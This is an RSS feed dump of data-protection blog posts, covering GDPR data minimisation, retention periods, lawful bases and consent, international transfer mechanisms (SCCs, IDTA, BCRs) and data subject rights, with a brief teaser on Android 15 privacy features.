&lt;p&gt;Absolutely! Suppose the head of marketing reported to the board that the organisation is marketing to a million people. That &lt;em&gt;sounds&lt;/em&gt; good – except that figure is incredibly misleading if only a tiny percentage engages with that marketing.&lt;/p&gt;



&lt;p&gt;Sure, collecting more information &lt;em&gt;technically&lt;/em&gt; means more business opportunity. But it also means more risk: if you suffer a &lt;a href="https://www.itgovernance.co.uk/blog/how-long-do-you-have-to-report-a-data-breach" rel="noreferrer noopener" target="_blank"&gt;data breach&lt;/a&gt;, the impact will be far greater.&lt;/p&gt;



&lt;p&gt;More data also means more storage space, which tends to go hand in hand with a larger attack surface. In other words, it’s not just the potential impact that’s greater – you’re more likely to suffer a breach to begin with.&lt;/p&gt;



&lt;p&gt;Not to mention how storage space costs money, both for &lt;a href="https://www.itgovernance.co.uk/blog/7-ways-to-avoid-physical-security-threats-in-the-workplace" rel="noreferrer noopener" target="_blank"&gt;hard-copy&lt;/a&gt; and digital information. That cost can grow exponentially when also accounting for backups.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Purpose-limitation"&gt;Purpose limitation&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;What’s a clue that an organisation is processing too much personal data?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;When you can’t point to a clear reason for storing or processing that personal data. [Principle 2 – purpose limitation.]&lt;/p&gt;



&lt;p&gt;If you can’t point to one, that’s not just unlawful – it strongly signals that keeping the data serves no &lt;em&gt;business&lt;/em&gt; purpose either.&lt;/p&gt;



&lt;p&gt;This is what I like about the GDPR – if you adhere to its principles, you’re not just protecting people’s data, but also running your business better.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Can you give us a real-life example?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Visitor logs are a good one. What do you keep them for? What purpose do they serve?&lt;/p&gt;



&lt;p&gt;Well, they’re generally used to account for who is within the building on a given day – in case of having to do a headcount if you had to evacuate the building, for example.&lt;/p&gt;



&lt;p&gt;So, why would you need to keep those logs for any longer than that day? [Which many organisations do.]&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Shouldn’t you keep visitor logs for the same time you keep &lt;/strong&gt;&lt;a href="https://www.itgovernance.co.uk/blog/does-your-use-of-cctv-comply-with-the-gdpr" rel="noreferrer noopener" target="_blank"&gt;&lt;strong&gt;CCTV&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt; footage?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;&lt;em&gt;Exactly&lt;/em&gt;. A couple of years back, I was on-site with a client. They had me sign a visitor’s book. They also took my picture.&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Me: “Why do you need my picture?”&lt;/li&gt;



&lt;li&gt;Client: “If we identify suspicious activity on CCTV, we can use those pictures to identify the person.”&lt;/li&gt;



&lt;li&gt;M: “Excellent! So, how long do you keep your CCTV footage for?”&lt;/li&gt;



&lt;li&gt;C: “We store it on a rolling 30-day cycle.”&lt;/li&gt;



&lt;li&gt;M: “Fantastic. How long do you keep visitor pictures for?”&lt;/li&gt;



&lt;li&gt;C: “We’ve got them going back to 2009.”&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;That stayed with me as the perfect example of people not understanding why they’re collecting data, how they’re using that data, or how long they should be keeping it for.&lt;/p&gt;



&lt;p&gt;That said, this is just &lt;em&gt;one&lt;/em&gt; reason for collecting this information. In specific scenarios, you may have to keep it for extended periods.&lt;/p&gt;



&lt;p&gt;A good example might be that an incident had taken place, so you need to keep the footage and pictures from a specific period for longer – the duration of the investigation and possible court case.&lt;/p&gt;



&lt;p&gt;Your retention periods can allow for leeway to your usual periods for these types of scenarios – you can set out the &lt;em&gt;criteria&lt;/em&gt; for setting your retention periods as well as concrete time periods.&lt;/p&gt;



&lt;p&gt;Either way, it comes back to data minimisation and purpose limitation: only collect personal data for a specific purpose, and keep it only for as long as necessary for that purpose.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Retention-periods"&gt;Retention periods&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;Let’s come back to your earlier marketing example: an organisation has a massive marketing mailing list but only a fraction of people on it interact with that marketing.&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Where do we go from there?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Your &lt;a href="https://www.itgovernance.co.uk/blog/top-tips-for-data-retention-under-the-gdpr" rel="noreferrer noopener" target="_blank"&gt;retention schedule&lt;/a&gt; should make clear when you’re archiving those records [assuming you don’t use them for other purposes] after some reasonable period. That might be six months, or perhaps a year.&lt;/p&gt;



&lt;p&gt;At a minimum, your retention schedule should set out the &lt;em&gt;criteria&lt;/em&gt; for setting the retention periods. [Also see the earlier explanation.]&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;What does ‘archiving’ mean in this context? And how long should it remain in the archive before the data is permanently deleted or destroyed?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;If someone ends up on a marketing list, you may have already been processing their data for a different reason – most obviously, because they purchased something.&lt;/p&gt;



&lt;p&gt;So, suppose that person opted out of marketing. You’d then no longer actively process their data, but you’d need to store their records to meet your legal and/or contractual obligations. That’s a form of archiving – storing personal data and safeguarding it with encryption, or another appropriate measure, but not doing anything else with that data.&lt;/p&gt;



&lt;p&gt;You’d then destroy it once the retention period for that legal or contractual obligation runs out.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Can data be truly destroyed?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Most organisations will simply click ‘delete’, and not do additional storage media sanitisation, like overwriting it at least seven times to sanitise the storage media, or use a software solution that ‘shreds’ the data electronically.&lt;/p&gt;



&lt;p&gt;But the GDPR is risk-based, and in many circumstances, such state-of-the-art measures wouldn’t be proportionate. So, someone just presses ‘delete’, then the data should be gone – including from backups – within a month of that deletion.&lt;/p&gt;



&lt;p&gt;The key is to make the personal data unidentifiable, using the tools reasonably available. After all, it’s a criminal offence to attempt to re-identify de-identified data!&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Coming back to retention periods, how can an organisation establish a “reasonable” retention period?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Organisations must ask themselves: when do we say ‘enough is enough’? Where do we draw that line in the sand and stop contacting this person? When does it become clear that they’re not going to respond, and we’re wasting time and resources by trying to contact them again?&lt;/p&gt;



&lt;p&gt;The exact moment depends on the organisation. What type of product or service are you trying to sell? If you’re a luxury retailer, or selling high-ticket items like fridge freezers, your expectations are different to an organisation that sells, say, monthly subscriptions.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;What other problems do you see around data retention?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;One classic scenario is what you do with the data of someone who leaves an organisation. You’ll then archive the record – but what part of that record?&lt;/p&gt;



&lt;p&gt;The trouble is that organisations treat personal data as a ‘bundle’, rather than look at the individual categories of data.&lt;/p&gt;



&lt;p&gt;For example, unless you had to use the person’s emergency contact details while they were employed, you can likely destroy that part of their record immediately after they leave. You no longer have a reason to keep that data.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;

&lt;/div&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Lawful-bases"&gt;Lawful bases&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;We’ve touched on the reasons for, or purposes of, processing a few times now. Of course, these link closely to the &lt;/strong&gt;&lt;a href="https://www.itgovernance.co.uk/blog/gdpr-lawful-bases-for-processing-with-examples" rel="noreferrer noopener" target="_blank"&gt;&lt;strong&gt;lawful bases&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt;. The basic GDPR rules around them seem reasonably straightforward: you need to be able to rely on one of the six lawful bases to process personal data lawfully.&lt;/strong&gt;&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="" class="wp-image-47017" height="454" src="https://www.itgovernance.co.uk/blog/wp-content/uploads/2024/11/image-2.png" width="938" /&gt;&lt;/figure&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;So, where do problems arise?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;People don’t understand that the lawful bases are &lt;em&gt;not&lt;/em&gt; an open-ended ticket – they need &lt;em&gt;time limits&lt;/em&gt;. They need &lt;em&gt;relevance&lt;/em&gt; [i.e. purpose limitation].&lt;/p&gt;



&lt;p&gt;You need to know what your legal and contractual requirements are for data processing and retention. Beyond that, you need to understand what &lt;em&gt;you&lt;/em&gt; need the data for.&lt;/p&gt;



&lt;p&gt;Let’s take a basic example: an employment contract.&lt;/p&gt;



&lt;p&gt;When you employ someone, the contract will say you’re processing personal data to fulfil your contractual obligations. Upon termination of that contract, the lawful basis changes. At that point, you’re keeping the personal data for six years to meet a legal obligation.&lt;/p&gt;



&lt;p&gt;Some organisations might extend that to seven years, but that means you have to change the lawful basis again at the end of the sixth year: to legitimate interests. And you’ll have to show you can justify that legitimate interest through your LIA [legitimate interests assessment].&lt;/p&gt;



&lt;p&gt;Again, understand the lawful basis you’re relying on and its limitations. Whatever the purpose for processing, it needs to come with a life span appropriate to that purpose.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Consent"&gt;Consent&lt;/h2&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="" class="wp-image-47016" height="423" src="https://www.itgovernance.co.uk/blog/wp-content/uploads/2024/11/image-1.png" width="938" /&gt;&lt;/figure&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Speaking of lawful bases, let’s come back to consent.&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;The ‘typical’ requirements of consent aside [see above], must consent also be refreshed? And is there a link with appropriate retention periods, when processing personal data for marketing purposes?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Refreshing consent isn’t an explicit GDPR requirement – you either have consent or you don’t. The ICO was clear about that in the early days of the GDPR, and said something similar about the &lt;a href="https://www.itgovernance.co.uk/the-pecr-and-eu-eprivacy-directive" rel="noreferrer noopener" target="_blank"&gt;PECR&lt;/a&gt; [Privacy and Electronic Communications Regulations 2003].&lt;/p&gt;



&lt;p&gt;This includes the time-limit aspect. Once your retention period is hit, you no longer have consent – it’s not a grey area. You must then either archive that data or get new consent.&lt;/p&gt;



&lt;p&gt;That means asking the person if they want to receive marketing on XYZ – remember, consent must be clear, informed and given for a specific purpose to be valid.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;What happens if one person in an organisation withdraws consent for marketing? Would you then be able to market to others within that same organisation?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;Yes – the consent is for that individual, not for the overall organisation.&lt;/p&gt;



&lt;p&gt;Equally, if you’re about to approach a new person in that organisation, and someone else has already objected to marketing, you can still ask this other person for their consent.&lt;/p&gt;



&lt;p&gt;That said, be aware of the CTPS and FPS [Corporate Telephone Preference Service and Fax Preference Service]. These are central UK registers for businesses to opt out of unsolicited marketing phone calls and faxes, and apply to all employees within the businesses listed.&lt;/p&gt;



&lt;p&gt;So, before you make cold calls [or send cold faxes], check those registers.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;What else must marketers be aware of around consent and the GDPR?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;If you buy a marketing list, and email the people on that list, people may opt out of marketing from your organisation.&lt;/p&gt;



&lt;p&gt;Suppose that, a few weeks or months later, you then buy a new marketing list that has some duplicate email addresses with the first list. Make sure you don’t email those people again by putting them on a suppression list.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Lawful-processing:-not-breaking-other-laws"&gt;Lawful processing: not breaking other laws&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;We’ve talked a lot about the lawful bases under the GDPR. What about the other sense of ‘lawful’ processing [under the first data protection principle] – not breaking any other laws?&lt;/strong&gt;&lt;/p&gt;



&lt;p&gt;The EU GDPR was designed to integrate with EU laws, so you won’t get conflicts there. And although the UK has now left the EU, we haven’t seen too many differences between UK and EU law post-Brexit – at least, as far as data privacy and data processing go.&lt;/p&gt;



&lt;p&gt;But the further afield you go, the more problems you might run into – I gave an example of that in &lt;a href="https://www.itgovernance.co.uk/blog/transferring-personal-data-under-the-gdpr#Mechanism-3" rel="noreferrer noopener" target="_blank"&gt;my blog&lt;/a&gt; about international transfers. [A large Saudi Arabian organisation is prevented by national law to report data breaches outside Saudi Arabia.]&lt;/p&gt;



&lt;p&gt;In a nutshell, the stricter requirement will always apply. That’s typically been the GDPR, particularly within Europe. However, we may see more divergence as the Regulation ages, and more new laws with stricter requirements than the GDPR emerge.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;

&lt;p&gt;Consequently, you must put an appropriate mechanism or safeguard in place to &lt;a href="https://www.itgovernance.co.uk/blog/transferring-personal-data-under-the-gdpr" rel="noreferrer noopener" target="_blank"&gt;transfer personal data internationally&lt;/a&gt;, such as:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;The IDTA (international data transfer agreement);&lt;/li&gt;



&lt;li&gt;SCCs (standard contractual clauses); or&lt;/li&gt;



&lt;li&gt;BCRs (binding corporate rules).&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Let’s take a closer look at these mechanisms, and when and how to use them.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;In this blog&lt;/h2&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#What-are-SCCs-and-the-IDTA"&gt;What are SCCs and the IDTA?&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#When-and-how-do-I-use-SCCs-the-IDTA"&gt;When and how do I use SCCs/the IDTA?&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#What-are-BCRs"&gt;What are BCRs?&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#When-should-I-implement-BCRs"&gt;When should I implement BCRs?&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#How-can-we-use-BCRs"&gt;How can we use BCRs?&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="What-are-SCCs-and-the-IDTA"&gt;What are SCCs and the IDTA?&lt;/h2&gt;



&lt;p&gt;Article 46(2)(c) of the EU GDPR allows for “standard data protection clauses adopted by the [European] Commission”. These are your ‘SCCs’ or ‘standard contractual clauses’.&lt;/p&gt;



&lt;p&gt;Post-Brexit, the UK introduced its own version of these model contractual clauses: the ‘IDTA’ or ‘international data transfer agreement’, but the same principles apply to both.&lt;/p&gt;



&lt;p&gt;Organisations can use these model contractual clauses to comply with their Article 28 requirements around &lt;a href="https://www.itgovernance.co.uk/blog/gdpr-article-28-contracts-what-you-need-to-know" rel="noreferrer noopener" target="_blank"&gt;processor contracts&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;But they’re also a safeguard for international transfers if used correctly. Here are some points to consider:&lt;/p&gt;



&lt;ul class="wp-block-list li-spaced"&gt;
&lt;li&gt;Select the correct model clauses – the clauses are different for data controllers vs processors, and differ depending on the countries you’re sending data to.&lt;/li&gt;



&lt;li&gt;You can’t amend or remove the mandatory clauses of the IDTA/SCCs, but can amend their commercial terms, provided that they don’t change the meaning of the pre-written clauses. If you want to modify other aspects of the agreement, you’ll need to create a new contract.&lt;/li&gt;



&lt;li&gt;The clauses only apply to the data processing activities set out in the SCCs/IDTA. So, you must draft new contracts every time the activities change.&lt;/li&gt;



&lt;li&gt;You must complete a risk assessment, which will tell you whether you can proceed with the international data transfer. These are called:&lt;ul&gt;&lt;li&gt;IDTA: the TRA (transfer risk assessment).&lt;/li&gt;&lt;/ul&gt;
&lt;ul class="wp-block-list"&gt;
&lt;li&gt;SCCs: the TIA (transfer impact assessment).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Bear in mind that both the IDTA and SCCs are legal contracts. As such, we urge organisations to &lt;a href="https://www.itgovernance.co.uk/shop/product/gdpr-contract-and-legal-services" rel="noreferrer noopener" target="_blank"&gt;consult a data protection lawyer&lt;/a&gt; when creating them – because oversights in their terms or clauses could cause major problems.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="When-and-how-do-I-use-SCCs-the-IDTA"&gt;When and how do I use SCCs/the IDTA?&lt;/h2&gt;



&lt;p&gt;SCCs and the IDTA work well:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;For organisations likely to participate in two-way data sharing; and&lt;/li&gt;



&lt;li&gt;In internal personal data transfers where the processing is straightforward.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;However, in most cases, if the country you want to send personal data to has an adequacy decision, it makes more sense to rely on that.&lt;/p&gt;



&lt;p&gt;You also wouldn’t use SCCs or the IDTA if you’re an international organisation with an ongoing and/or complicated set of internal personal data transfers to undertake. This could quickly tie you up with &lt;em&gt;hundreds&lt;/em&gt; of SCCs to cover each pairing of entities, and each of your processing activities.&lt;/p&gt;



&lt;p&gt;In such a scenario, BCRs are usually more suitable.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;

&lt;/div&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="What-are-BCRs"&gt;What are BCRs?&lt;/h2&gt;



&lt;p&gt;BCRs are a set of internal rules (a bit like a code of conduct) that regulate international personal data transfers within a single multinational.&lt;/p&gt;



&lt;p&gt;They also act as a public acknowledgement of the privacy rights of individuals whose data is being processed. This can improve the organisation’s reputation among potential data subjects and other stakeholders.&lt;/p&gt;



&lt;p&gt;BCRs can be cumbersome to implement, because they cover a much larger and more complex set of processing activities than SCCs. That said, you just need &lt;em&gt;one&lt;/em&gt; set of rules, so long as:&lt;/p&gt;



&lt;ul class="wp-block-list li-spaced"&gt;
&lt;li&gt;These are properly integrated into all data privacy laws you may need to comply with, including the UK and EU GDPR; and&lt;/li&gt;



&lt;li&gt;You have the correct supporting documents to go with them, like:&lt;ul&gt;&lt;li&gt;A list of covered entities;&lt;/li&gt;&lt;/ul&gt;&lt;ul&gt;&lt;li&gt;Data privacy policies and procedures;&lt;/li&gt;&lt;/ul&gt;&lt;ul&gt;&lt;li&gt;Data protection audit plans; and&lt;/li&gt;&lt;/ul&gt;
&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Guidelines for employees.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;








&lt;p&gt;This can make BCRs particularly suitable for large organisations that operate in many different countries or territories.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="When-should-I-implement-BCRs"&gt;When should I implement BCRs?&lt;/h2&gt;



&lt;p&gt;BCRs can apply to both controller and processor agreements/processing activities (of that single organisation).&lt;/p&gt;



&lt;p&gt;And once implemented and approved by the supervisory authority (which we’ll get to &lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#How-can-we-use-BCRs"&gt;below&lt;/a&gt;), BCRs have advantages like:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Making data protection an integral part of your organisation’s processes;&lt;/li&gt;



&lt;li&gt;Reducing compliance costs when you make changes to your processing activities; and&lt;/li&gt;



&lt;li&gt;Providing flexibility when you introduce new products or services (which usually changes your processing activities).&lt;/li&gt;
&lt;/ul&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="How-can-we-use-BCRs"&gt;How can we use BCRs?&lt;/h2&gt;



&lt;p&gt;The UK ICO (Information Commissioner’s Office) and European Commission regulate the use of the UK and EU BCRs respectively.&lt;/p&gt;



&lt;p&gt;Organisations that want to use EU BCRs must apply to a relevant supervisory authority to have their rules approved. The organisation must also designate a lead authority, who:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Advises other affected authorities, such as those in all EU member states where the organisation has offices; and&lt;/li&gt;



&lt;li&gt;Facilitates the authorisation process with other applicable data protection authorities.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;To use the UK BCRs, organisations must apply to the ICO. The regulator’s &lt;a href="https://ico.org.uk/for-organisations/uk-gdpr-guidance-and-resources/international-transfers/guide-to-binding-corporate-rules/a-uk-bcr-addendum/" rel="noreferrer noopener" target="_blank"&gt;website&lt;/a&gt; has more information on the application process.&lt;/p&gt;



&lt;p&gt;BCRs can take 12 months or more to complete and, without legal assistance, can become onerous and extremely time-consuming.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;Let GRCI Law help&lt;/h2&gt;

&lt;li&gt;Managing BCR registrations with supervisory authorities.&lt;/li&gt;

There is always a bunch of little changes to discover in an Android release, whether by reading, poking around, or letting your phone show you 25 new things after it restarts.&lt;/p&gt;
&lt;p&gt;In Android 15, some of the most notable involve making your device less appealing to snoops and thieves and more secure against the kids to whom you hand your phone to keep them quiet at dinner. There are also smart fixes for screen sharing, OTP codes, and cellular hacking prevention, but details about them are spread across Google's own docs and blogs and various news site's reports.&lt;/p&gt;
&lt;p&gt;Here's what is notable and new in how Android 15 handles privacy and security.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/gadgets/2024/10/android-15s-security-and-privacy-features-are-the-updates-highlight/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

Organisations must let individuals know how they can exercise these rights, and meet requests promptly. Failure to do so is a violation of the GDPR and could lead to disciplinary action. But first, what is a data subject?&lt;/p&gt;
&lt;p&gt;The post &lt;a href="https://www.itgovernance.co.uk/blog/what-are-the-data-subject-rights-under-the-gdpr"&gt;GDPR: Data Subject Rights and Organisations’ Responsibilities&lt;/a&gt; appeared first on &lt;a href="https://www.itgovernance.co.uk/blog"&gt;IT Governance Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;Both the&amp;nbsp;UK and EU &lt;a href="https://www.itgovernance.co.uk/data-protection-dpa-and-eu-data-protection-regulation" rel="noreferrer noopener" target="_blank"&gt;GDPR (General Data Protection Regulation)&lt;/a&gt;&amp;nbsp;grant data subjects certain rights over their data, which, if exercised, data controllers must facilitate.&lt;/p&gt;



&lt;p&gt;Along with the data protection principles, the data subject rights – outlined in Articles 12–22 – are fundamental to the Regulation.&lt;/p&gt;



&lt;p&gt;Individuals suffer when their &lt;a href="https://www.itgovernance.co.uk/blog/gdpr-how-the-definition-of-personal-data-will-change" rel="noreferrer noopener" target="_blank"&gt;personal data&lt;/a&gt; is lost, stolen or abused, so those who process it must look after it properly. Furthermore, organisations don’t own that data – it continues to belong to the individual, which the eight data subject rights reflect.&lt;/p&gt;



&lt;p&gt;Let’s go through them all.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;In this blog&lt;/h2&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#The-right-to-be-informed"&gt;The right to be informed&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#The-right-of-access"&gt;The right of access&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#The-right-to-rectification"&gt;The right to rectification&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#The-right-to-erasure"&gt;The right to erasure&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#The-right-to-restrict-processing"&gt;The right to restrict processing&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#The-right-to-data-portability"&gt;The right to data portability&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#The-right-to-object"&gt;The right to object&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;a href="https://www.itgovernance.co.uk/blog/category/data-protection/feed#Rights-related-to-automated-decision-making-including-profiling"&gt;Rights related to automated decision-making, including profiling&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="The-right-to-be-informed"&gt;1. The right to be informed (Article 13 and Article 14)&lt;/h2&gt;



&lt;p&gt;You need to tell individuals:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;What personal data you’re collecting from them;&lt;/li&gt;



&lt;li&gt;How you’re using it (or will be using it);&lt;/li&gt;



&lt;li&gt;How long you’re keeping it for; and&lt;/li&gt;



&lt;li&gt;Various other information.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Most data controllers choose to communicate this information via a &lt;a href="https://www.itgovernance.co.uk/blog/how-to-write-a-gdpr-privacy-notice-with-documentation-template-example" rel="noreferrer noopener" target="_blank"&gt;privacy notice&lt;/a&gt; (but this isn’t your only way to facilitate this right).&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="The-right-of-access"&gt;2. The right of access (Article 15)&lt;/h2&gt;



&lt;p&gt;Data subjects may request a copy of the personal data you’re processing (on that data subject), as well as information you must also share under Articles 13 and 14 (the right to be informed).&lt;/p&gt;



&lt;p&gt;This includes:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;The purpose(s) of processing;&lt;/li&gt;



&lt;li&gt;The categories of personal data;&lt;/li&gt;



&lt;li&gt;The recipients of the personal data;&lt;/li&gt;



&lt;li&gt;Whether &lt;a href="https://www.itgovernance.co.uk/blog/gdpr-automated-decision-making-and-profiling-what-are-the-requirements" rel="noreferrer noopener" target="_blank"&gt;automated decision-making&lt;/a&gt; is taking place, its significance, and envisaged consequences for the data subject; and&lt;/li&gt;



&lt;li&gt;Whether you’re transferring the data &lt;a href="https://www.itgovernance.co.uk/blog/transferring-personal-data-under-the-gdpr" rel="noreferrer noopener" target="_blank"&gt;internationally&lt;/a&gt;, and if so, what safeguards are in place.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;You must also inform data subjects of their other GDPR rights. That includes the right to lodge a complaint with the supervisory authority. In the UK, that’s the ICO (Information Commissioner’s Office).&lt;/p&gt;



&lt;p&gt;When a data subject exercises their right of access, we usually refer to this as a &lt;a href="https://www.itgovernance.co.uk/blog/how-to-respond-to-a-data-subject-access-request" rel="noreferrer noopener" target="_blank"&gt;DSAR (data subject access request)&lt;/a&gt;. But they’re not obliged to use that (or any other) specific phrase for their request to be valid.&lt;/p&gt;



&lt;p&gt;When someone exercises this right, you must respond within one month.&lt;/p&gt;

&lt;div class="flex-video flex-video-youtube"&gt;&lt;/div&gt;
&lt;/div&gt;&lt;/figure&gt;



&lt;div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-17 wp-block-buttons-is-layout-flex"&gt;
&lt;div class="wp-block-button"&gt;&lt;a class="wp-block-button__link has-white-color has-luminous-vivid-orange-background-color has-text-color has-background has-link-color wp-element-button" href="https://www.itgovernance.co.uk/dsar-compliance-how-to-handle-requests-and-build-trust" rel="noreferrer noopener" target="_blank"&gt;Download now&lt;/a&gt;&lt;/div&gt;
&lt;/div&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="The-right-to-rectification"&gt;3. The right to rectification (Article 16)&lt;/h2&gt;



&lt;p&gt;One of the key GDPR principles (Article 5(1)(d)) is ‘accuracy’.&lt;/p&gt;



